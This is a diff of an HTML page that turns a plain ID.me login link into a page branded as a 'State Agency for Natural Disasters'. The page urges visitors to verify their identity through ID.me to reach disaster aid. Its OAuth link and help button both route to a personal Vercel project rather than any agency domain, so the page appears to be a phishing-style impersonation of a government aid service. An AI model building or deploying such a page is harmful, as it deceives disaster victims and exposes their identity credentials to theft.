@@ -1,14 +1,97 @@
-<div><br class="Apple-interchange-newline"><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verify with ID.me</title>
+  <title>State Agency for Natural Disasters</title>
+  <!-- Google Fonts for better typography -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    /* Global Styles */
+    body {
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f6f9;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    header {
+      background-color: #004080;
+      color: #fff;
+      text-align: center;
+      padding: 1rem 0;
+      font-size: 1.5rem;
+    }
+    main {
+      flex: 1;
+      padding: 2rem;
+      text-align: center;
+    }
+    h1 {
+      margin-bottom: 1rem;
+    }
+    .button-container {
+      margin-top: 2rem;
+    }
+    .idme-button {
+      display: inline-block;
+      background-color: #0072ce;
+      color: #fff;
+      padding: 1rem 2rem;
+      margin: 0.5rem;
+      text-decoration: none;
+      border-radius: 5px;
+      font-size: 1rem;
+      font-weight: 700;
+      transition: background-color 0.3s ease;
+    }
+    .idme-button:hover {
+      background-color: #005ea2;
+    }
+    footer {
+      background-color: #004080;
+      color: #fff;
+      text-align: center;
+      padding: 1rem 0;
+    }
+  </style>
 </head>
 <body>
-  <h1>Verify Your Identity</h1>
-  <a href="https://api.id.me/oauth/authorize?client_id=28bf5c72de76f94a5fb1d9454e347d4e&redirect_uri=https://idme-auth-justjacob77s-projects.vercel.app/callback.html&response_type=code&scope=login">
-    <button>Verify with ID.me</button>
-  </a>
+
+  <!-- Header -->
+  <header>
+    <h1>State Agency for Natural Disasters</h1>
+    <p>Your trusted resource for emergency verification and services</p>
+  </header>
+
+  <!-- Main Content -->
+  <main>
+    <h1>Verify Your Identity to Access Resources</h1>
+    <p>Please verify your identity through ID.me to access state assistance programs and disaster recovery resources.</p>
+
+    <!-- Button Section -->
+    <div class="button-container">
+      <!-- ID.me Verification Button -->
+      <a href="https://api.id.me/oauth/authorize?client_id=28bf5c72de76f94a5fb1d9454e347d4e&redirect_uri=https://idme-auth-justjacob77s-projects.vercel.app/callback.html&response_type=code&scope=openid" 
+         class="idme-button">
+        Verify with ID.me
+      </a>
+
+      <!-- Help Button -->
+      <a href="https://idme-auth-justjacob77s-projects.vercel.app/help" 
+         class="idme-button" style="background-color: #6c757d;">
+        Learn More
+      </a>
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer>
+    <p>&copy; 2024 State Agency for Natural Disasters. All rights reserved.</p>
+  </footer>
+
 </body>
-</html></div>
+</html>
